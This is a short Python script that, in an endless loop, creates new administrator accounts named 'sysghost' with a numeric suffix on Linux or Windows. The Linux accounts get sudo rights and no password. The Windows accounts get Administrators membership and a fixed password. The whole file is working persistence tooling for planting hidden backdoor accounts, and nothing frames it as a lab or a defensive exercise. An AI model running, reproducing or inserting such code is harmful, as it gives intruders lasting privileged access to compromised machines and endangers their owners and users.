import os
import platform
import subprocess
import random
import string
import time

def random_username(prefix="sys_"):
    return prefix + ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

def create_linux_user(username):
    try:
        subprocess.run(['sudo', 'useradd', '-m', '-s', '/bin/bash', username])
        subprocess.run(['sudo', 'usermod', '-aG', 'sudo', username])
        subprocess.run(['sudo', 'passwd', '-d', username])  # No password login (set up SSH later)
        print(f"[+] Created Linux user: {username}")
    except Exception as e:
        print(f"[-] Failed Linux user creation: {e}")

def create_windows_user(username):
    try:
        subprocess.run(['net', 'user', username, 'P@ssw0rd123!', '/add'])
        subprocess.run(['net', 'localgroup', 'Administrators', username, '/add'])
        print(f"[+] Created Windows user: {username}")
    except Exception as e:
        print(f"[-] Failed Windows user creation: {e}")

def user_exists(username):
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output(['net', 'user', username]).decode()
            return username in output
        else:
            return username in open('/etc/passwd').read()
    except:
        return False

def main_loop():
    base_user = "sysghost"
    check_interval = 300  # seconds

    while True:
        current_user = base_user
        suffix = 0
        while user_exists(current_user):
            suffix += 1
            current_user = f"{base_user}{suffix}"

        if platform.system() == "Windows":
            create_windows_user(current_user)
        else:
            create_linux_user(current_user)

        time.sleep(check_interval)

if __name__ == "__main__":
    main_loop()
